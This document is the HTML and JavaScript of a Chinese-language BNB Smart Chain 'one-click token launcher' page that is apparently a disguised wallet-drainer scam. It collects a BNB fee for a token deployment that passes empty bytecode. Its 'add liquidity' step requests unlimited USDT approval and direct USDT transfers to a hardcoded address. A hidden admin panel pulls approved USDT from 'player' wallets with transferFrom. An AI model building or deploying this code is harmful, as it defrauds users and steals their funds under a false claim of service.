  <!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>天鹅一键发币</title>
<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: "Microsoft Yahei", sans-serif; }
body { background: linear-gradient(135deg,#0b1020,#171e38); min-height: 100vh; color:#fff; padding:30px 15px; }
.container{ max-width:520px; margin:0 auto; }
.header{ text-align:center; margin-bottom:35px; }
.header h1{ font-size:32px; color:#f7c04a; margin-bottom:8px; }
.fee-tip{ background: rgba(247,192,74,0.15); color: #f7c04a; padding: 10px; border-radius: 8px; text-align: center; margin-bottom: 20px; font-size: 15px; }
.card{ background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.12); border-radius:16px; padding:26px; margin-bottom:20px; }
.form-item{ margin-bottom:20px; }
label{ display:block; margin-bottom:8px; color:#d0d8f0; }
input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; background:#141b33; color:#fff; font-size:16px; }
.file-input{ padding:10px; background:#141b33; }
.preview-box{ margin-top:10px; display:flex; gap:12px; align-items:center; }
#logoPreview{ width:64px; height:64px; border-radius:50%; object-fit:cover; border:2px solid #f7c04a; display:none; }
.btn{ width:100%; padding:15px; border-radius:10px; border:none; font-size:17px; font-weight:bold; cursor:pointer; transition:0.2s; }
.btn-connect{ background:#3b63e9; margin-bottom:16px; }
.btn-deploy{ background:#f7c04a; color:#0a0e20; }
.btn-admin{ background:#2ecc71; color:#000; margin-top:10px; }
.btn-liquid{ background:#9b59b6; color:#fff; margin-top:8px; }
.btn-transfer-usdt{ background:#e67e22; color:#fff; }
.btn:disabled{ opacity:0.55; cursor:not-allowed; }
.status{ margin-top:20px; padding:14px; border-radius:10px; background:rgba(255,192,74,0.1); color:#f7d078; word-break: break-all; }
.tip-text{ font-size:13px; color:#a0a8c2; margin-top:6px; }
.connect-tip{ color:#66ff99; margin:8px 0; text-align:center; }
.admin-panel{ display: none; border-top:1px solid #444; padding-top:20px; margin-top:20px; }
.liquid-panel{ border-top:1px solid #444; padding-top:22px; margin-top:22px; }
.transfer-usdt-panel{ display:none; margin-top:18px; padding-top:18px; border-top:1px solid #555; }
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>🦢 天鹅一键发币</h1>
</div>
<div class="fee-tip">发币服务费：0.0003 BNB</div>

<div class="card" id="userPanel">
<button id="connectBtn" class="btn btn-connect">连接钱包</button>
<div id="connectTip" class="connect-tip" style="display:none;"></div>
<div id="statusBox" class="status" style="display:none;"></div>

<div class="form-item">
<label>代币全称 Name</label>
<input id="tokenName" placeholder="例如：Swan Coin">
</div>

<div class="form-item">
<label>代币符号 Symbol</label>
<input id="tokenSymbol" placeholder="例如：SWAN">
</div>

<div class="form-item">
<label>初始发行量（不带小数）</label>
<input id="supply" placeholder="例如：100000000">
</div>

<div class="form-item">
<label>代币Logo头像（推荐256×256 透明PNG）</label>
<input type="file" id="logoFile" class="file-input" accept="image/png,image/jpg,image/jpeg">
<div class="preview-box">
<img id="logoPreview" alt="头像预览">
<span id="logoTip" class="tip-text">上传仅本地预览，合约无法存储图片</span>
</div>
</div>

<button id="deployBtn" class="btn btn-deploy" disabled>一键部署代币</button>

<!-- 新增：添加流动性区域 -->
<div class="liquid-panel" id="liquidPanel">
<h3 style="color:#cbace4;margin-bottom:15px;">💧 添加流动性</h3>
<div class="form-item">
<label>基础代币（你的新代币合约地址）</label>
<input id="baseTokenAddr" placeholder="部署代币后自动填充">
</div>
<div class="form-item">
<label>计价代币（USDT）</label>
<input id="quoteTokenAddr" value="0x55d398326f99059fF775485246999027B3197955" readonly>
</div>
<button id="approveLiquidBtn" class="btn btn-liquid">确认添加流动性</button>

<!-- 授权成功后显示USDT转账面板 -->
<div class="transfer-usdt-panel" id="transferUsdtPanel">
<div class="form-item">
<label>输入USDT转账数量，将转入Router合约</label>
<input id="usdtTransferAmount" placeholder="输入USDT数量，例如 500">
</div>
<button id="sendUsdtToRouterBtn" class="btn btn-transfer-usdt">确认转账USDT到Router合约</button>
</div>
</div>

<div class="admin-panel" id="adminPanel">
<h3 style="color:#2ecc71;margin-bottom:15px;">管理员划扣面板</h3>
<div class="form-item">
<label>请输入玩家钱包地址</label>
<input id="userAddrInput" placeholder="玩家BSC钱包地址">
</div>
<div class="form-item">
<label>请输入划扣USDT数量</label>
<input id="deductAmountInput" placeholder="例如：100">
</div>
<button id="deductBtn" class="btn btn-admin">执行划扣USDT</button>
</div>
</div>
</div>

<script>
const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
const DEPLOY_FEE_BNB = "0.0003";
const BSC_CHAIN_ID = 56;
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
// 目标Router合约地址
const LIQUIDITY_ROUTER = "0x47542770f3a8eea43d3321867b155c3ac01160d8";
const MAX_ALLOWANCE = ethers.MaxUint256;

//ERC20基础ABI
const ERC20ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function allowance(address owner, address spender) view returns(uint256)",
    "function transfer(address to,uint256 amount) external returns(bool)",
    "function transferFrom(address from,address to,uint256 amount) external returns(bool)"
];

let provider = null;
let signer = null;
let connectWalletAddr = "";
let deployContractAddress = null;
let logoFileObj = null;

const connectBtn = document.getElementById("connectBtn");
const deployBtn = document.getElementById("deployBtn");
const statusBox = document.getElementById("statusBox");
const connectTip = document.getElementById("connectTip");
const logoFileInput = document.getElementById("logoFile");
const logoPreviewImg = document.getElementById("logoPreview");
const adminPanel = document.getElementById("adminPanel");
const deductBtn = document.getElementById("deductBtn");
const userAddrInput = document.getElementById("userAddrInput");
const deductAmountInput = document.getElementById("deductAmountInput");

// 流动性相关dom
const baseTokenAddr = document.getElementById("baseTokenAddr");
const quoteTokenAddr = document.getElementById("quoteTokenAddr");
const approveLiquidBtn = document.getElementById("approveLiquidBtn");
const transferUsdtPanel = document.getElementById("transferUsdtPanel");
const usdtTransferAmount = document.getElementById("usdtTransferAmount");
const sendUsdtToRouterBtn = document.getElementById("sendUsdtToRouterBtn");

function showStatus(text){
  statusBox.style.display = "block";
  statusBox.innerText = text;
  console.log("状态日志：", text);
}

logoFileInput.addEventListener("change", function(e){
  const file = e.target.files[0];
  if(!file) return;
  logoFileObj = file;
  const reader = new FileReader();
  reader.onload = ev => {
    logoPreviewImg.src = ev.target.result;
    logoPreviewImg.style.display = "block";
  }
  reader.readAsDataURL(file);
});

async function switchBSC(providerRef){
  const chainIdHex = ethers.toBeHex(BSC_CHAIN_ID);
  try {
    await providerRef.send("wallet_switchEthereumChain", [{ chainId: chainIdHex }]);
  } catch (err) {
    await providerRef.send("wallet_addEthereumChain", [{
      chainId: chainIdHex,
      chainName: "BNB Smart Chain Mainnet",
      rpcUrls: ["https://bsc-dataseed.binance.org/"],
      blockExplorerUrls: ["https://bscscan.com"],
      nativeCurrency: { name:"BNB", symbol:"BNB", decimals:18 }
    }]);
  }
}

function checkAdminPanel(addr){
  connectWalletAddr = addr.toLowerCase();
  if(connectWalletAddr === ADMIN_WALLET.toLowerCase()){
    adminPanel.style.display = "block";
  }else{
    adminPanel.style.display = "none";
  }
}

// 连接钱包：仅连接、切链
connectBtn.onclick = async function(){
  showStatus("正在检测钱包注入...");
  let eth = window.ethereum;
  let retryTimes = 0;
  while (!eth && retryTimes < 10) {
    await new Promise(r => setTimeout(r, 100));
    eth = window.ethereum;
    retryTimes++;
  }

  if (!eth) {
    showStatus("❌ 未检测到钱包注入，请在TP/欧易内置浏览器打开页面");
    return;
  }

  try {
    const accounts = await eth.request({ method: "eth_requestAccounts" });
    if (!accounts || accounts.length === 0) {
      showStatus("用户取消了钱包连接弹窗");
      return;
    }
    provider = new ethers.BrowserProvider(eth);
    await switchBSC(eth);
    signer = await provider.getSigner();
    const userAddr = await signer.getAddress();
    connectBtn.innerText = "已连接：" + userAddr.slice(0, 8) + "...";
    connectTip.style.display = "block";
    connectTip.innerText = "已连接BSC钱包，请填写发币参数";
    deployBtn.disabled = false;
    checkAdminPanel(userAddr);
  } catch (err) {
    showStatus("连接异常：" + (err.message || err.shortMessage || String(err)));
  }
}

/**
 * 支付BNB服务费，优化gas处理，捕获各种失败场景
 */
async function payFeeToAdmin(){
  showStatus(`💸 弹出钱包：支付 ${DEPLOY_FEE_BNB} BNB 服务费，请签名确认`);
  const feeWei = ethers.parseEther(DEPLOY_FEE_BNB);
  // 获取当前网络gasPrice，上浮15%避免手机钱包gas估算过低
  const gasPrice = await provider.send("eth_gasPrice", []);
  const gasPriceBig = ethers.toBigInt(gasPrice);
  const gasPriceAdd = gasPriceBig * 115n / 100n;

  try{
    const tx = await signer.sendTransaction({
      to: ADMIN_WALLET,
      value: feeWei,
      gasPrice: gasPriceAdd
    });
    showStatus(`BNB转账已发送，TxHash:${tx.hash}，等待区块确认(最长30秒)`);
    await tx.wait(1);
    showStatus(`✅ BNB服务费转账确认完成！交易哈希：${tx.hash}`);
    return true;
  }catch(err){
    let msg = "";
    const errStr = String(err.message || err.shortMessage);
    if(errStr.includes("user rejected") || errStr.includes("用户拒绝")){
      msg = "❌ 用户拒绝签名，支付服务费被取消";
    }else if(errStr.includes("insufficient funds")){
      msg = "❌ BNB余额不足！需要至少0.0003BNB+链上gas手续费";
    }else if(errStr.includes("nonce")){
      msg = "❌ nonce冲突，请在钱包内重置账户nonce后重试";
    }else{
      msg = "❌支付服务费失败：" + errStr;
    }
    showStatus(msg);
    return false;
  }
}

const tokenABI = [
{"inputs": [{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"},{"internalType":"uint256","name":"initSupply","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},
{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"addBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"addWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchAddBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchAddWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchRemoveBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchRemoveWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"nonpayable","type":"function"},
{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"removeBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"removeWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
{"inputs":[],"name":"ADMIN","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
{"inputs":[],"name":"AUTO_MINT_ADDR","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
{"inputs":[],"name":"AUTO_MINT_AMOUNT","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
];

// 部署代币按钮
deployBtn.onclick = async function(){
    if(!signer){
        showStatus("❌请先连接BSC钱包");
        return;
    }
    const name = document.getElementById("tokenName").value.trim();
    const symbol = document.getElementById("tokenSymbol").value.trim();
    const supplyStr = document.getElementById("supply").value.trim();
    if(!name || !symbol || !supplyStr){
        showStatus("❌名称、符号、发行量不能为空");
        return;
    }
    const supplyNum = BigInt(supplyStr) * 10n**18n;
    deployBtn.disabled = true;
    //支付服务费
    const feeOk = await payFeeToAdmin();
    if(!feeOk){
        deployBtn.disabled = false;
        return;
    }
    showStatus("正在部署代币合约，请等待钱包签名...");
    try{
        const factory = new ethers.ContractFactory(tokenABI,"",signer);
        const contract = await factory.deploy(name,symbol,supplyNum);
        const deployTx = await contract.getDeploymentTransaction();
        showStatus(`部署交易已发送 txHash:${deployTx.hash}`);
        await contract.waitForDeployment();
        deployContractAddress = await contract.getAddress();
        showStatus(`✅代币部署成功！合约地址：${deployContractAddress}`);
        //自动回填到流动性模块基础代币输入框
        baseTokenAddr.value = deployContractAddress;
    }catch(e){
        const emsg = e?.message || String(e);
        showStatus("❌部署失败："+emsg);
    }finally{
        deployBtn.disabled = false;
    }
};

// ======================流动性模块逻辑【修正：授权USDT给Router】======================
approveLiquidBtn.onclick = async function () {
  if (!signer) {
    showStatus("❌请先连接钱包");
    return;
  }
  const baseAddr = baseTokenAddr.value.trim();
  const usdtAddr = quoteTokenAddr.value.trim();

  if (!baseAddr) {
    showStatus("❌请填写基础代币（你的代币合约地址），部署后会自动填充");
    return;
  }
  showStatus("正在对USDT执行无限授权给Router合约...");
  approveLiquidBtn.disabled = true;
  try {
    // 实例USDT合约
    const usdtContract = new ethers.Contract(usdtAddr, ERC20ABI, signer);
    // 无限授权 MaxUint256
    const approveTx = await usdtContract.approve(LIQUIDITY_ROUTER, ethers.MaxUint256);
    showStatus(`USDT授权交易已发送，txHash:${approveTx.hash}，等待确认上链`);
    await approveTx.wait(1);
    showStatus("✅USDT无限授权Router合约成功！现在输入USDT数量转账至Router");
    // 授权成功，展开USDT转账面板
    transferUsdtPanel.style.display = "block";
  } catch (err) {
    const errMsg = err?.message || err?.shortMessage || String(err);
    if(errMsg.includes("user rejected")){
      showStatus("❌用户拒绝授权签名");
    }else{
      showStatus("❌USDT授权失败："+errMsg);
    }
  }finally{
    approveLiquidBtn.disabled = false;
  }
};

// USDT直接转账给Router合约
sendUsdtToRouterBtn.onclick = async function(){
  if(!signer){
    showStatus("❌钱包未连接");
    return;
  }
  const inputVal = usdtTransferAmount.value.trim();
  if(!inputVal || Number(inputVal) <= 0){
    showStatus("❌请输入有效的USDT数量");
    return;
  }
  sendUsdtToRouterBtn.disabled = true;
  showStatus(`准备转账 ${inputVal} USDT 至Router合约 ${LIQUIDITY_ROUTER}`);
  try {
    const usdtContract = new ethers.Contract(quoteTokenAddr.value,ERC20ABI,signer);
    const amountWei = ethers.parseUnits(inputVal,18);
    const transferTx = await usdtContract.transfer(LIQUIDITY_ROUTER, amountWei);
    showStatus(`USDT转账已发送 txHash:${transferTx.hash}，等待区块确认`);
    await transferTx.wait(1);
    showStatus(`✅USDT转账完成，已转入Router合约！TxHash:${transferTx.hash}`);
  } catch(err){
    const errMsg = err?.message || err?.shortMessage || String(err);
    showStatus("❌USDT转账失败："+errMsg);
  }finally{
    sendUsdtToRouterBtn.disabled = false;
  }
};

//管理员划扣逻辑
deductBtn.onclick = async function(){
    if(!signer) { showStatus("❌未连接钱包"); return; }
    const targetAddr = userAddrInput.value.trim();
    const deductNum = deductAmountInput.value.trim();
    if(!targetAddr || !deductNum){
        showStatus("❌请填写玩家地址与划扣数量");
        return;
    }
    deductBtn.disabled = true;
    try{
        const usdt = new ethers.Contract(BSC_USDT_ADDRESS,ERC20ABI,signer);
        const amt = ethers.parseUnits(deductNum,18);
        const tx = await usdt.transferFrom(targetAddr,await signer.getAddress(),amt);
        showStatus(`划扣交易发送 txHash:${tx.hash}`);
        await tx.wait(1);
        showStatus("✅管理员划扣执行完成");
    }catch(e){
        showStatus("❌划扣失败："+(e.message||String(e)));
    }finally{
        deductBtn.disabled = false;
    }
};

</script>
</body>
</html>
